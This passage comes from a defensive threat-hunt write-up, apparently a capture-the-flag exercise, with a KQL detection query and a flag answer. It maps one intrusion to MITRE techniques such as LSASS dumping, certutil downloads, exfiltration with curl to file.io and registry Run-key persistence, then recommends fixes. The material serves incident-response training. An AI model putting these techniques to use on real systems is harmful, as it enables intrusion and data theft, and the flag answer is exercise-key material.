| where TimeGenerated >= todatetime('2025-11-22T00:38:47.8327343Z')
| where FileName has_any ("PSReadLine", "history", "ConsoleHost_history.txt", "Clear-History", "clear", ".txt")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine
```
<img width="1200" alt="20" src="https://github.com/user-attachments/assets/ef3e3d84-d43e-4e9c-b05d-d049b9b05de7" />

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 22, 2025, 2:26:01 AM |
| Action | FileDeleted |
| Filename | ConsoleHost_history.txt |
| Full Path | C:\Users\fileadmin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt |
| Initiated By | powershell.exe |

**Analysis:**

The attacker deleted the PowerShell command history file `ConsoleHost_history.txt` to cover their tracks. This file, managed by the PSReadLine module, logs all interactive PowerShell commands across sessions and persists after the session ends. It is a valuable forensic artifact that would have contained a complete record of the attacker's PowerShell activities on the file server.

This anti-forensic action occurred near the end of the attack sequence (2:26 AM), just before the attacker deleted the credential dumping tool `pd.exe` (2:26:23 AM), demonstrating a methodical cleanup approach before concluding operations on the file server.

**MITRE ATT&CK Reference:**
- Indicator Removal: Clear Command History (T1070.003)

**Flag Answer:** `ConsoleHost_history.txt`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | External Remote Services | T1133 | RDP from 159.26.106.98 |
| Initial Access | Valid Accounts | T1078 | kenji.sato, fileadmin credentials |
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | mstsc.exe to azuki-fileserver01 |
| Lateral Movement | Use Alternate Authentication Material | T1550 | fileadmin credential reuse |
| Discovery | Network Share Discovery | T1135 | net share, net view commands |
| Discovery | Account Discovery: Local Account | T1087.001 | net user command |
| Discovery | Permission Groups Discovery: Local Groups | T1069.001 | net localgroup administrators |
| Discovery | System Owner/User Discovery | T1033 | whoami /all command |
| Discovery | System Network Configuration Discovery | T1016 | ipconfig /all, arp -a |
| Defense Evasion | Hide Artifacts: Hidden Files and Directories | T1564.001 | attrib +h +s on staging directory |
| Defense Evasion | Masquerading: Rename System Utilities | T1036.003 | pd.exe (ProcDump) |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | svchost.ps1 in System32 |
| Defense Evasion | Ingress Tool Transfer | T1105 | certutil.exe downloads |
| Defense Evasion | System Binary Proxy Execution | T1218 | certutil.exe abuse |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | pd.exe LSASS dump |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | IT-Admin-Passwords.csv |
| Collection | Data Staged: Local Data Staging | T1074.001 | C:\Windows\Logs\CBS |
| Collection | Data from Network Shared Drive | T1039 | xcopy from FileShares |
| Collection | Automated Collection | T1119 | xcopy with /E /H flags |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | tar.exe compression |
| Exfiltration | Exfiltration Over Web Service | T1567 | curl.exe to file.io |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | file.io uploads |
| Persistence | Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | FileShareSync registry key |
| Anti-Forensics | Indicator Removal: Clear Command History | T1070.003 | ConsoleHost_history.txt deletion |
| Anti-Forensics | Indicator Removal: File Deletion | T1070.004 | pd.exe deletion |

---

## Recommendations

### Immediate Actions

1. **Disable compromised accounts** - Immediately disable kenji.sato and fileadmin accounts and force password resets for all users.

2. **Isolate affected systems** - Quarantine both azuki-sl and azuki-fileserver01 for forensic analysis.

3. **Remove persistence mechanisms:**
   - Delete registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\FileShareSync`
   - Remove malicious script: `C:\Windows\System32\svchost.ps1`
   - Clear staging directory: `C:\Windows\Logs\CBS`

4. **Block malicious infrastructure:**
   - 159.26.106.98 (Return access IP)
   - 78.141.196.6 (C2 server - all ports)
   - file.io at network perimeter

5. **Secure credential storage** - Immediately remove `IT-Admin-Passwords.csv` and implement proper secrets management (password vault, PAM solution).

### Long-term Improvements

1. **Implement credential hygiene** - Never store passwords in plaintext files; use enterprise password managers or PAM solutions.

2. **Enable PowerShell logging** - Configure Script Block Logging and Module Logging to capture PowerShell activity.

3. **Protect LSASS** - Enable Credential Guard and configure LSASS as a Protected Process.

4. **Monitor file sharing services** - Alert on uploads to anonymous file sharing services (file.io, transfer.sh, etc.).

5. **Registry monitoring** - Alert on modifications to Run/RunOnce registry keys.

6. **Network segmentation** - Restrict file server access to authorized systems only.

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Additional Details - By Threat Hunt Organizor](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-2-cargo-hold/docs/additional-details.md)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [Part 1 Investigation Report](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-1-port-of-entry)

